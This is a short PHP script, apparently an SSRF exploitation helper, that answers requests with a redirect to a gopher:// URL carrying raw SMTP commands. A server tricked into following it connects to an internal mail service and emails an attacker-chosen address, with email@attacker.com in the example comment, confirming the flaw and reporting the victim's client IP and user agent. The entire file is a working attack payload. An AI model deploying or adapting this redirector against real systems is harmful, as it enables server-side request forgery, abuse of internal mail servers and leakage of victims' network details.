<?php
#?proto=gopher&ip=0&port=25&domain=domain.com&to=email@attacker.com&code=301

if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
  $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
}

$commands = array(
	'HELO '.$_GET["domain"],
	'MAIL FROM: <admin@'.$_GET["domain"].'>',
	'RCPT To: <'.$_GET["to"].'>',
	'DATA',
	'Subject: SSRF2SMTP test',
	'Vulnerable, yay :)',
	'Client User Agent: '.$_SERVER['HTTP_USER_AGENT'],
	'Client IP: '.$_SERVER['REMOTE_ADDR'],
	'.'
);
$payload = implode('%0A', $commands);

header("HTTP/1.1 ".$_GET["code"]." Found");
header('Location: '.$_GET["proto"].'://'.$_GET["ip"].':'.$_GET["port"].'/_'.$payload);
header("Cache-Control: max-age=0, must-revalidate, no-cache, no-store, private");
header("Pragma: no-cache");
